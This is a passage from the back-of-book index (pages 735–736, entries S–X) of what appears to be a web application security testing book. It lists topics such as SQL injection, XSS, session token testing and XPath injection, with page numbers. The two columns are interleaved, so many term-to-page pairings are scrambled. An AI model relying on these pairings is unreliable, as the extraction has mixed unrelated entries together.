scope, 695–696\nfunctionality, 550\n148–149 check for disclosure of tokens\nin logs, 692\n70779bindex.qxd:WileyRed 9/14/07 3:16 PM Page 735\nIndex ■ S–T 735\nshared hosting, 542–543 T reflected request parameters,\nvirtual hosting, 543 704\nTapestry, Presentation Layer, 49\nvulnerabilities reflected XSS, 705\ntermination, sessions, 200–201\nsegregation between ASP- stored attacks, 706–707\ntesting access controls\nhosted applications, 721 testing for logic flaws\ninsecure access control\nsegregation in shared handling of incomplete input,\nmethods, 698\ninfrastructures, 720 718–719\nlimited access, 697–698\nShockwave Flash objects, 123–124 key attack surface, 717\nmultiple accounts, 697\nsignedness errors, 529–530 multistage processes, 718\nrequirements, 696–697\nSiteMesh, Presentation Layer, 49 transaction logic, 719–720\ntesting authentication mechanism\nsmartcards, authentication and, trust boundaries, 719\naccount recovery function, 682\n176 testing session management\ncheck for unsafe distribution of\nSMTP, code injection, 321–322 mechanism, 688\ncredentials, 685\ncommand injection, 323–324 check cookie scope, 695–696\ncheck for unsafe transmission\nemail header manipulation, check for disclosure of tokens\nof credentials, 684–685\n322–323 in logs, 692\nexploit any vulnerabilities to\nflaws, 324–325 check for insecure transmission\ngain unauthorized access,\npreventing, 325–326 of tokens, 691–692\n687–688\nSMTP injection, testing for, check for session fixation, 694\nimpersonation function, 683\n712–713 check for XSRF, 694–695\nlogic flaws, fail-open\nSOAP check mapping of tokens to\nconditions, 685–686\ncode injection, 313–316 sessions, 692–693\nmultistage mechanisms,\ninjection, testing for, 715 test session termination,\n686–687\nsoftware 693–694\npassword quality, 680\nnative bugs test tokens for meaning,\npredictability of auto-generated\nbuffer overflow 689–690\ncredentials, 684\nvulnerabilities, 585–586 test tokens for predictability,\nremember me function, 682–683\nformat string vulnerabilities, 690–691\nresilience to password\n586 understanding mechanism, 689\nguessing, 681\ninteger vulnerabilities, 586 thick-client components, 54–55,\nunderstand mechanism, 680\nsecurity hardening, 573 111–112\nusername enumeration,\nsource code, comments, 586–587 ActiveX controls, 119–120\n680–681\nspidering. Seeweb spidering decompiling managed code,\nusername uniqueness, 683–684\nSQL (Structured Query 124\ntesting client-side controls\nLanguage) exported functions, 122\nclient-side controls over user\ncode injection, 240–241 inputs, fixing, 123–124\ninput, 676\nbugs, 244–247 reverse engineering, 120–122\nthick-client components\nbypassing login, 243–244 Java applets, 112–114\nActiveX controls, 678\nDELETE statements, 250 bytecode obfuscation, 117–119\nJava applets, 677\nexploiting a basic decompiling Java bytecode,\nShockwave Flash objects,\nvulnerability, 241–243 114–117\n678–679\nINSERT statements, 248–249 third-party code components,\ntransmission of data via the\npreventing, 296–300 87–88\nclient, 675–676\nSELECT statements, 248 tiered architectures, 535–536\ntesting for function-specific input\nUNION operator, 250–255 attacking\nvulnerabilities\nUPDATE statements, 249–250 attacking tiers, 539–540\nLDAP injection, 715–716\ncomments, bypassing filters exploiting trust relationships\nnative software vulnerabilities,\nand, 268 between tiers, 537–538\n713–714\nerror messages, 292–295 subverting tiers, 538–539\nSMTP injection, 712–713\ninjection, 6, 581–582 securing\nSOAP injection, 715\ntesting for, 702–704 applying defense in depth,\nXPath injection, 716–717\nsyntax reference, 289–291 542\ntesting for input-based\nSSL (Secure Socket Layer), 6, 7 minimizing trust\nvulnerabilities\nciphers, weak, 727 relationships, 540–541\nfuzz all request parameters,\nsession tokens and, 192 segregating different\n699–702\nstack overflows, 522–523 components, 541–542\ntest for file inclusion, 711\nstack traces, 507–508 tokens. Seesession tokens\ntest for OS command injection,\nstate, 55, 176–177 disclosure in logs, 692\n707–708\nsessionless state mechanisms, insecure transmission, 691–692\ntest for path traversal, 709–710\n179 mapping to sessions, 692–693\ntest for script injection, 711\nstatic files, 222–223 strong, session management\ntest for SQL injection, 702–704\nstatus codes, HTTP responses, and, 206–208\ntest for XSS injection\n44–45 testing for meaning, 689–690\narbitrary redirection, 706\nstored attacks, testing for, testing for predictability,\nHTTP header injection,\n706–707 690–691\n705–706\ntransmitting, HTTPS, 208–209\n70779bindex.qxd:WileyRed 9/14/07 3:16 PM Page 736\n736 Index ■ T–X\nTRACE method, HTTP, 39 vulnerability scanners X\ntransaction logic, 719–720 challenges faced by, 653–656\nXPath\nTrojans, XSS and, 392–393 limitations, 651–653\ncode injection, 316–317\ntrust boundaries, 719 using, 658–659\nblind, 319–320\nvulnerabilities detected,\nflaws, 320–321\n649–651\npreventing, 321\nU vulnerable transmission of\nsubverting application logic,\ncredentials, 142–143\nUnicode encoding, 57 317–318\nUNION operator (SQL), code injection, testing for, 716–717\ninjection, 250–255 XSRF, 694–695\nW\nunprotected functionality, 219 XSS (cross-site scripting), 6,\nUPDATE statements (SQL), code web applications 376–377\ninjection, 249–250 benefits of, 4–5 chaining, 390–391\nURLs, 40–41 common functions, 3–4 client-side attack, escalating\nASCII characters, 56 evolution of, 2–5 attack other network hosts,\nencoding, 56 managing, 32–33 398\nparameters, 99–100 web browsers clipboard contents, 396\nuser access exploitation frameworks, currently used applications,\naccess control, 18–19 467–469 397\nauthentication, 16–17 Firefox, 624–626 exploit browser\nsession management, 17–18 Internet Explorer, 624 vulnerabilities, 399\nuser actions, inducing, 394 Opera, 626–627 history and search queries,\nUser-Agent header, HTTP vulnerabilities, 399 396\nrequest, 37 web server keystrokes, 396\nuser-directed web spidering, buffer overflow, vulnerabilities, port scanning local network,\n65–66 566–567 397–398\nuser impersonation functionality, configuration cross-site tracing, 421–423\n149–151 debug functionality, 555–556 delivery mechanisms\nuser input, 19–20 default content, 555–558 reflected and DOM-based\ncanonicalization, 26–27 default credentials, 554–555 attacks, 399–400\nentry points, identifying, 80–81 functions, 557–558 stored attacks, 400–401\ninput, validation, 23–25 sample functionality, 556–557 entry points, 405\ninput handling securing, 565–566 HttpOnly cookies, 421–423\naccept known good, 21–22 directory listings, 559–560 inducing user actions and, 394\nreject known bad, 21 encoding and canonicalization injection, testing for, 704–707\nsafe data handling, 22–23 vulnerabilities, 568–571 length limits, 411–413\nsanitization, 22 flaws, finding, 571–572 nonstandard content encoding\nsemantic checks, 23 HTTP methods, dangerous, US-ASCII, 414\ntypes, 20–21 560–562 UTF-7, 414\nvalidation path traversal vulnerabilities, UTF-16, 414\nboundary validation, 23–25 568 preventing attacks, 423–428\nmultistep, 26–27 as proxy, 562–564 real-world attacks, 388–390\nusernames software, securing, 572–574 reflected, 379\nauthentication and, 139 virtual hosting, misconfigured, request methods, 413–414\nnon-unique, 152–153 564–565 sanitization, 409–411\npredictable, 154 vulnerabilities, 721 signature-based filters, 406–409\nusers, input, 8–9 dangerous HTTP methods, trojans and, 392–393\n722–723 trust relationships, exploiting,\ndefault content, 722 394–395\nV default credentials, 722 virtual defacement and,\nvalidation proxy functionality, 723 391–392\nboundary validation, 23–25 virtual hosting vulnerabilities, 377–379\ncanonicalization, 26–27 misconfiguration, 723 DOM-based, 386–388\nmultistep, 26–27 web server software bugs, exploiting, 379–383\nscript-based, 108–110 723–724 finding and exploiting DOM-\nvendor patches, software, 572 web sites, 2 based, 417–421\nverbose failure messages, web spidering, 62–64 finding and exploiting\n139–141 user-directed, 65–66 reflected, 401–415\nvertical access controls, 218 WebDAV (Web-based Distributed finding and exploiting stored,\nvertical privilege escalation, 218 Authoring and Versioning), 415–417\nViewState (ASP.NET), 102–106 561 stored, 383–386\nWebScarab, 62, 97, 645–646\nvirtual hosting, 543\nwhite-box testing, 578–579\nmisconfigured, 564–565"
  }
]